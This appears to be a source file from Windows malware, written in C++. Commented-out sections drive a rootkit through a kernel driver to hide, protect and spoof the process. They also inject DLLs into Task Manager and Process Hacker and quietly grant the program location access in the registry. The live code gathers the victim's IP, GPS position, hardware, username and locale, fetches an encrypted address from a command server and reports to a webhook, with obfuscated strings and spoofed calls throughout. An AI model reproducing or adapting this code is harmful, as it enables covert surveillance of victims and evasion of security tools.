#include <Windows.h>
#include <Wininet.h>
#include <Urlmon.h>
#include <string>
#include <sstream>
#include <vector>
#include <bitset>
#include <atlsecurity.h> 
#include <functional>
#include <atlbase.h>
#include <codecvt>
#include <comdef.h>
#include <Wbemidl.h>
#include "Functions.h"
#include <lmcons.h>
#include <winrt/Windows.Foundation.h>
#include <winrt/Windows.Devices.Geolocation.h>
#include <unordered_set>
#include <locale>
#include <array>
#include <stdexcept>
#include <memory>
#pragma comment(lib, "dxgi.lib")
#include <dxgi.h>



using namespace winrt;
using namespace winrt::Windows::Devices::Geolocation;
using namespace winrt::Windows::Foundation;

std::unordered_set<std::string> ActionList;

#define code_rw CTL_CODE(FILE_DEVICE_UNKNOWN, 0x31, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define code_rs CTL_CODE(FILE_DEVICE_UNKNOWN, 0x35, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define code_spf CTL_CODE(FILE_DEVICE_UNKNOWN, 0x36, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define code_security 0x85b3e12

typedef struct _ba {
	INT32 security;
	INT32 process_id;
} ba, * pba;


typedef struct _rs {
	INT32 security;
	INT32 process_id;
	BYTE Protection;
} rs, * prs;

typedef struct _spf {
	INT32 security;
	INT32 process_id;
	INT32 spoof_id;

} spf, * pspf;

bool fail = false;

bool IsTskOn;
bool IsProcessHkrOn;

int lastpidex = 0;
int lastpidtsk = 0;
int lastpidphk = 0;

/*
void Rootingen()
{
	SPOOF_FUNC;

	try
	{

		DWORD pidex = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("explorer.exe")));

		if (pidex && (!lastpidex || lastpidex != pidex))
		{
			SPOOF_CALL(Sleep)(300);

			////JUNK();
			HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pidex);

			ManualMapDll(hProc, delele.data(), delele.size());

			lastpidex = pidex;

			CloseHandle(hProc);
		}

		DWORD pidtsk = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("Taskmgr.exe")));
		//std::cout << EC("Tskmgr PID ") << pidtsk << std::endl;

		if (pidtsk && (!lastpidtsk || lastpidtsk != pidtsk))
		{
			SPOOF_CALL(Sleep)(50);

			IsTskOn = true;

			////JUNK();
			HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pidtsk);

			ManualMapDll(hProc, deleletsk.data(), deleletsk.size());

			lastpidtsk = pidtsk;

			CloseHandle(hProc);

		}
		else if (!pidtsk)
		{
			IsTskOn = false;
		}

		DWORD pidphk = SPOOF_CALL(GetProcessIdByName)(stringToWchar(EC("ProcessHacker.exe")));
		//std::cout << EC("Prchk PID ") << pidphk << std::endl;

		if (pidphk && (!lastpidphk || lastpidphk != pidphk))
		{
			SPOOF_CALL(Sleep)(50);

			IsProcessHkrOn = true;

			////JUNK();
			HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pidphk);

			ManualMapDll(hProc, deleletsk.data(), deleletsk.size());

			lastpidphk = pidphk;

			CloseHandle(hProc);

		}
		else if (!pidphk)
		{
			IsProcessHkrOn = false;
		}
	}
	catch (...) {}
}


DWORD WINAPI MrRoot(void* data)
{

	while (true)
	{
		__try
		{
			Rootingen();
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			continue;
		}
	}

	////JUNK();

	std::cout << EC("Starting Rttkit loop") << std::endl;

	while (true)
	{    }

	return 0;
}

void RootLoop()
{

	int PID = SPOOF_CALL(GetCurrentProcessId)();
	std::cout << PID << std::endl;

	////JUNK();
	HANDLE deviceObject = CreateFile(EC(L"\\\\.\\msmodule"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);


	if (deviceObject == INVALID_HANDLE_VALUE) {
		std::cout << EC("Cannot open driver, trying to map it.") << std::endl;

		HPSol::fuckmeatm();
		////JUNK();

		std::cout << EC("Mapped, retrying.") << std::endl;
		////JUNK();

		deviceObject = CreateFile(EC(L"\\\\.\\msmodule"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

		if (deviceObject == INVALID_HANDLE_VALUE) {

			std::cout << EC("Rootkit Failed.") << std::endl;
			////JUNK();
			fail = true;

		}

	}

	if (!fail)
	{
		std::cout << EC("Sending Rootkit Commands") << std::endl;

		int driverOutput = 0;

		_ba req = {0};
		req.process_id = PID;
		req.security = code_security;

		if (DeviceIoControl(deviceObject, code_rw, &req, sizeof(_ba), &driverOutput, sizeof(int), 0, NULL)) {

			std::cout << EC("[RTTKIT] Hide sent") << std::endl;
		}
		else {
			std::cout << EC("[RTTKIT] Hide error") << std::endl;
		}

		int driverOutput2 = 0;

		_rs req2 = { 0 };
		req2.process_id = PID;
		req2.Protection = 0x41;
		req2.security = code_security;

		if (DeviceIoControl(deviceObject, code_rs, &req2, sizeof(_rs), &driverOutput2, sizeof(int), 0, NULL)) {

			std::cout << EC("[RTTKIT] Protect sent") << std::endl;
		}
		else {
			std::cout << EC("[RTTKIT] Protect error") << std::endl;
		}

		SPOOF_CALL(Sleep)(1500);


		int driverOutput3 = 0;

		_spf req3 = { 0 };
		req3.process_id = PID;
		req3.spoof_id = 5217;
		req3.security = code_security;

		if (DeviceIoControl(deviceObject, code_spf, &req3, sizeof(_spf), &driverOutput3, sizeof(int), 0, NULL)) {

			std::cout << EC("[RTTKIT] Spuf sent") << std::endl;
		}
		else {
			std::cout << EC("[RTTKIT] Spuf error") << std::endl;
		}


		SPOOF_CALL(CloseHandle)(deviceObject);
		////JUNK();

	}


	CreateThread(NULL, 0, MrRoot, NULL, 0, NULL);
}*/



void RootkitInit()
{
	SPOOF_FUNC;


	/*int PID = SPOOF_CALL(GetCurrentProcessId)();
	std::cout << PID << std::endl;

	////JUNK();
	HANDLE deviceObject = CreateFile(EC(L"\\\\.\\msmodule"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);


	if (deviceObject == INVALID_HANDLE_VALUE) {
		std::cout << EC("Cannot open driver, trying to map it.") << std::endl;

		HPSol::fuckmeatm();
		////JUNK();

		std::cout << EC("Mapped, retrying.") << std::endl;
		////JUNK();

		deviceObject = CreateFile(EC(L"\\\\.\\msmodule"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

		if (deviceObject == INVALID_HANDLE_VALUE) {

			std::cout << EC("Rootkit Failed.") << std::endl;
			////JUNK();
			fail = true;

		}

	}

	if (!fail)
	{
		std::cout << EC("Sending Rootkit Commands") << std::endl;

		int driverOutput = 0;

		_ba req = { 0 };
		req.process_id = PID;
		req.security = code_security;

		if (DeviceIoControl(deviceObject, code_rw, &req, sizeof(_ba), &driverOutput, sizeof(int), 0, NULL)) {

			std::cout << EC("[RTTKIT] Hide sent") << std::endl;
		}
		else {
			std::cout << EC("[RTTKIT] Hide error") << std::endl;
		}*/

		/*int driverOutput2 = 0;

		_rs req2 = { 0 };
		req2.process_id = PID;
		req2.Protection = 0x41;
		req2.security = code_security;

		if (DeviceIoControl(deviceObject, code_rs, &req2, sizeof(_rs), &driverOutput2, sizeof(int), 0, NULL)) {

			std::cout << EC("[RTTKIT] Protect sent") << std::endl;
		}
		else {
			std::cout << EC("[RTTKIT] Protect error") << std::endl;
		}

		SPOOF_CALL(Sleep)(1500);


		int driverOutput3 = 0;

		_spf req3 = { 0 };
		req3.process_id = PID;
		req3.spoof_id = 4;
		req3.security = code_security;

		if (DeviceIoControl(deviceObject, code_spf, &req3, sizeof(_spf), &driverOutput3, sizeof(int), 0, NULL)) {

			std::cout << EC("[RTTKIT] Spuf sent") << std::endl;
		}
		else {
			std::cout << EC("[RTTKIT] Spuf error") << std::endl;
		}


		SPOOF_CALL(CloseHandle)(deviceObject);
		////JUNK();

	}*/

	//CreateThread(NULL, 0, RootLoop, NULL, 0, NULL);




}

/*
void GivePerms()
{
	SPOOF_FUNC;

	try
	{
		const wchar_t* keyPath = EC(L"Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location");
		const wchar_t* valueName = EC(L"Value");
		const wchar_t* newValue = EC(L"Allow");

////JUNK();


		HKEY hKey;
		LONG openResult = RegCreateKeyExW(HKEY_CURRENT_USER, keyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

		if (openResult == ERROR_SUCCESS)
		{
			try
			{
				// Set the new value
				RegSetValueExW(hKey, valueName, 0, REG_SZ, (BYTE*)newValue, (wcslen(newValue) + 1) * sizeof(wchar_t));
				std::wcout << EC(L"Registry key updated successfully.") << std::endl;
			}
			catch (std::exception& ex)
			{
				std::wcout << EC(L"Error: ") << ex.what() << std::endl;
			}

			// Close the registry key
			RegCloseKey(hKey);
		}
		else
		{
			std::wcout << EC(L"Registry key not found, and unable to create it.") << std::endl;
		}
	}
	catch (std::exception& ex)
	{
		std::wcout << EC(L"Exception: ") << ex.what() << std::endl;
	}

	try
	{
		const wchar_t* keyPath2 = EC(L"Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location\\NonPackaged");
		const wchar_t* valueName2 = EC(L"Value");
		const wchar_t* newValue2 = EC(L"Allow");

		HKEY hKey2;
		LONG openResult2 = RegCreateKeyExW(HKEY_CURRENT_USER, keyPath2, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey2, NULL);

		if (openResult2 == ERROR_SUCCESS)
		{
			try
			{
				// Set the new value
				RegSetValueExW(hKey2, valueName2, 0, REG_SZ, (BYTE*)newValue2, (wcslen(newValue2) + 1) * sizeof(wchar_t));
				std::wcout << EC(L"Registry2 key updated successfully.") << std::endl;
			}
			catch (std::exception& ex)
			{
				std::wcout << EC(L"Error2: ") << ex.what() << std::endl;
			}

			// Close the registry key
			RegCloseKey(hKey2);
		}
		else
		{
			std::wcout << EC(L"Registry2 key not found, and unable to create it.") << std::endl;
		}
	}
	catch (std::exception& ex)
	{
		std::wcout << EC(L"Exception: ") << ex.what() << std::endl;
	}
}*/



std::string GetIpRiyal()
{
	SPOOF_FUNC;

	std::string result;

	// Try to get IP from checkip.amazonaws.com
	HINTERNET hInternet = InternetOpen(EC(L"A WinINet Example Program"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet)
	{
		HINTERNET hConnect = InternetOpenUrl(hInternet, L"http://checkip.amazonaws.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
		if (hConnect)
		{
			char buffer[4096];
			DWORD bytesRead;
			if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
			{
				buffer[bytesRead] = '\0';
				result = buffer;
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}

	////JUNK();


	if (result.empty())
	{
		// Try other services if the first one fails
		const char* urls[] = {
			EC("https://ipinfo.io/ip"),
			EC("https://api.ipify.org"),
			EC("https://icanhazip.com"),
			EC("https://wtfismyip.com/text"),
			EC("http://bot.whatismyipaddress.com/")
		};

		for (const char* url : urls)
		{
			hInternet = InternetOpen(EC(L"A WinINet Example Program"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
			if (hInternet)
			{
				HINTERNET hConnect = InternetOpenUrl(hInternet, Utf8ToWide(url).c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
				if (hConnect)
				{
					char buffer[4096];
					DWORD bytesRead;
					if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
					{
						buffer[bytesRead] = '\0';
						result = buffer;
						break;
					}
					InternetCloseHandle(hConnect);
				}
				InternetCloseHandle(hInternet);
			}
		}
	}

	if (result.empty())
	{
		// Try another method if all else fails
		hInternet = InternetOpen(EC(L"A WinINet Example Program"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		if (hInternet)
		{
			HINTERNET hConnect = InternetOpenUrl(hInternet, L"http://checkip.dyndns.org/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
			if (hConnect)
			{
				char buffer[4096];
				DWORD bytesRead;
				if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
				{
					buffer[bytesRead] = '\0';
					std::string response(buffer);
					size_t start = response.find(EC("Address: ")) + 9;
					size_t end = response.find(EC("</body>")) - start;
					result = response.substr(start, end);
				}
				InternetCloseHandle(hConnect);
			}
			InternetCloseHandle(hInternet);
		}
	}

	return result;
}



void GetGPSReal(double& lat, double& lon, double& acc)
{
	winrt::init_apartment();

	// Create a Geolocator object
	Geolocator geolocator;

	// Get the geoposition asynchronously
	Geoposition pos = geolocator.GetGeopositionAsync().get();

	// Extract the latitude and longitude
	lat = pos.Coordinate().Point().Position().Latitude;
	lon = pos.Coordinate().Point().Position().Longitude;
	acc = pos.Coordinate().Accuracy();
}


void GetGPS(double& lat, double& lon, double& acc)
{

	__try
	{
		GetGPSReal(lat, lon, acc);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		lat = 31;
		lon = 31;
		acc = 31;
	}

}

std::string GetCpuName()
{
	SPOOF_FUNC;

	////JUNK();

	try
	{
		WCHAR value[1012];
		DWORD BufferSize = sizeof(value);
		RegGetValue(HKEY_LOCAL_MACHINE, EC(L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), EC(L"ProcessorNameString"), RRF_RT_REG_SZ, NULL, (PVOID)value, &BufferSize);

		return wcharToString(value);
	}
	catch (...)
	{
		return EC("Error");
	}

}

std::string GetGPUNamear() {
	IDXGIFactory* pFactory;
	IDXGIAdapter* pAdapter;
	std::string gpuName = EC("Unknown");

	if (SUCCEEDED(CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&pFactory))) {
		if (SUCCEEDED(pFactory->EnumAdapters(0, &pAdapter))) {
			DXGI_ADAPTER_DESC desc;
			if (SUCCEEDED(pAdapter->GetDesc(&desc))) {
				char buffer[128];
				wcstombs(buffer, desc.Description, sizeof(buffer));
				gpuName = std::string(buffer);
			}
			pAdapter->Release();
		}
		pFactory->Release();
	}
	return gpuName;
}

void GetGpuName(std::string& gpu, int& Vram)
{
	SPOOF_FUNC;

	std::vector<DXGI_ADAPTER_DESC1> Cards;

	HRESULT hr;
	IDXGIFactory1* pFactory = nullptr;

	// Create a DXGI Factory
	hr = CreateDXGIFactory1(__uuidof(IDXGIFactory1), (void**)(&pFactory));
	if (FAILED(hr)) {
		std::cerr << EC("Failed to create DXGI Factory.\n");
		gpu = EC("GPU Error");
	}
	else
	{
		// Enumerate the adapters (GPUs)
		IDXGIAdapter1* pAdapter = nullptr;
		bool gpuFound = false;
		for (UINT i = 0; pFactory->EnumAdapters1(i, &pAdapter) != DXGI_ERROR_NOT_FOUND; ++i) {
			DXGI_ADAPTER_DESC1 adapterDesc;
			pAdapter->GetDesc1(&adapterDesc);

			// Skip software adapters (e.g., Microsoft Basic Render Driver)
			if (adapterDesc.Flags & DXGI_ADAPTER_FLAG_SOFTWARE) {
				continue;
			}

			Cards.push_back(adapterDesc);
			gpuFound = true;

			pAdapter->Release();
		}

		if (!gpuFound) {
			std::cout << EC("No valid hardware GPU found.\n");
		}

		pFactory->Release();

		// Check for Nvidia, AMD, Intel, or no compatible GPU
		gpu = EC("No Compatible GPU");

		for (const auto& card : Cards) {

			std::wstring wDescription(card.Description);
			std::string description(wDescription.begin(), wDescription.end());

			if (description.find(EC("NVIDIA")) != std::string::npos) {
				gpu = description;
				Vram = 8;
				break;
			}
			else if (description.find(EC("AMD")) != std::string::npos || description.find(EC("Radeon")) != std::string::npos) {
				gpu = description;
				Vram = 8;
				break;
			}
		}

		// If no Nvidia or AMD GPU is found, check for Intel GPU
		if (gpu == EC("No Compatible GPU")) {
			for (const auto& card : Cards) {

				std::wstring wDescription(card.Description);
				std::string description(wDescription.begin(), wDescription.end());

				if (description.find(EC("Intel")) != std::string::npos) {
					gpu = description;
					Vram = 8;
					break;
				}
			}
		}
	}
}

bool hasFourOrMoreDots(const std::string& str) {
	int dotCount = 0;

	for (char ch : str) {
		if (ch == '.') {
			dotCount++;
			if (dotCount >= 4) {
				return true;
			}
		}
	}

	return false;

}

string RealIP()
{
	SPOOF_FUNC;

	try
	{
		////JUNK();
		string Dwnld = DownloadString(dmns, EC("/index.php?security=2&type=rtttry"));//
		std::cout << EC("IP Result: ") << Dwnld << std::endl;

		if (Dwnld.empty()) {
			SendWBHK(hwidglobal + EC(" IP Empty Error: ") + Dwnld);
			return EC("");
		}

		string url = Decrypt(Dwnld, EC("mysekretuwu"));//
		std::cout << url << std::endl;

		if (hasFourOrMoreDots(url)) {
			SendWBHK(hwidglobal + EC(" IP Usual Error: ") + url);
			return EC("");
		}

		return url;
	}
	catch (const std::exception& e)
	{
		printf(EC("Error On Real IP"));
		return "";
	}
}



std::string GetCountryName()
{
	SPOOF_FUNC;

	// Get the current user locale
	LCID locale = GetUserDefaultLCID();

	// Get the ISO 3166 two-letter country/region code
	char country[3];
	GetLocaleInfoA(locale, LOCALE_SISO3166CTRYNAME, country, sizeof(country));

	return country;
}


std::string GetWindowsVersion() {
	SPOOF_FUNC;

	std::cout << "Windows Version: " << USER_SHARED_DATA->NtBuildNumber << "\n";

	if (USER_SHARED_DATA->NtBuildNumber >= 22000)
	{
		return "11";
	}
	else
	{
		return "10";
	}
}

std::string GetCurrentUserName()
{

	DWORD bufferLength = UNLEN + 1;
	char username[UNLEN + 1];
	if (GetUserNameA(username, &bufferLength))
	{
		return username;
	}
	else
	{
		return EC("Unknown");
	}
}